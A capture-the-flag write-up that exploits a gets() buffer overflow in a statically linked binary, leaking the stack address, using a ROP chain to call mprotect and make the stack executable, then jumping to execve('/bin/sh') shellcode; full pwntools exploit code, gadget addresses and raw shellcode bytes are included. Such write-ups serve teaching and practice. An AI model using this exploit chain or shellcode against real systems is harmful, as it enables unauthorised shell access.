# MPROTECT

## Binary information

Running file on the binary we see that it is statically linked. So compared to the previous task, now we cannot overwrite contents of the GOT table and perform a `ret2libc` attack.

Running checksec on the file reveals that the binary has **NX** enabled, which means we cannot execute shellcode. (yet)

Executing the binary we can see that it asks for input and after that it just exits.

## Reversing

Decompiling the binary using Ghidra we see that the vulnerability is obvious. The binary reads input in a buffer of size `32` using `gets` function.

Since the binary is `statically linked` we know that there is something to do with it. After looking at the symbols we see that we have the function `mprotect` available.

Mprotect is a system call in Linux that changes the permission of a memory region. We can use this to change the permission of the stack to `executable` and then execute our.

Mprotect takes 3 arguments:

- `addr`: The start address of the memory region whose permissions are to be changed.
- `len`: The length of the memory region whose permissions are to be changed.
- `prot`: The new permissions for the memory region.

One thing to note is that addr must be page aligned. In this case we assume that the page size is 4096 bytes so at least the last 12 bits of the address must be zero.

## Exploitation

But where is the start address of the page? We do not know where the stack is in memory at runtime. Luckily, the `__libc_stack_end` symbol is included in the binary. This symbol points to the end of the stack. We can use puts to leak this address

By following `x86_64` calling convention, the first argument is passed in `rdi`, the second in `rsi` and the third in `rdx`.

So we need to see if we can find the `ROP gadgets` that would help us set these three arguments. Using `ROPgadget` we see that we have the following gadgets:

![ROP gadgets](images/ROPgadgets.png)

Let's see what we have so far:

1. We have a buffer overflow vulnerability.
2. We have the `mprotect` function available.
3. We can leak the address of the end of the stack.
4. We can make the stack executable.

Let's see how the exploit looks until here. After printing the leaked address we jump to main again to read another payload.

```python
from pwn import *

io = remote("10.10.101.248", 9010)

stack_end_sym_addr = p64(0x004bfa70)

io.recvuntil(" libc üòè")
io.clean()

payload = b'A' * 40
popRDIAddr = p64(0x40191a) #pop rdi; ret
popRSIAddr = p64(0x40f4de) # pop rsi ; ret
popRDXAddr = p64(0x40181f) # pop rdx ; ret

payload += popRDIAddr
payload += stack_end_sym_addr
payload += p64(0x00411bd0) #puts addr
payload += p64(0x00401e61) #main addr

io.sendline(payload)
endAddrOfStack = u64(io.recvline().strip().ljust(8, b'\x00'))
```

Now we should have the address of the end of the stack. Let's make the stack executable.

```python
pageAddress = endAddrOfStack & 0xffffffffffff0000 # change permission of 0x10000 bytes to be sure we include our payload

io.recvuntil(" libc üòè")
io.clean()

# int mprotect (void * __addr, size_t __len, int __prot)
#                   RDI             RSI         EDX
payload = b'A' * 40

payload += popRDIAddr
payload += p64(pageAddress)

payload += popRSIAddr
payload += p64(0x10000) # length

payload += popRDXAddr
payload += p64(0x7) #permissions RWX

payload += p64(0x00449b70) #mroptect addr
```

After executing the code above, if we look with the debugger we can see that we have the whole stack as `RWX`.

Now we can write and execute our shellcode, but how do we modify the IP to point to our shellcode? We can use the the following gadget:

- `0x0000000000463c43 : jmp rsp`

When exiting the `mprotect` function, we pop into RIP the address of the gadget above. Then if the shellcode is right after that address, RSP will point straight to it, because it got incremented during the RET instruction.

For this exploit I have used a simple `execve(/bin/sh)` shellcode from [exploit-db](https://www.exploit-db.com/exploits/47008).

Remotely I had to add an extra ret instruction for stack alignment.

```python
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

jmpRSPAddr = p64(0x463c43) # jmp rsp
payload += jmpRSPAddr
payload += p64(0x00401eac) #ret for movaps allignment
payload += shellcode

io.sendline(payload)
io.interactive()
```
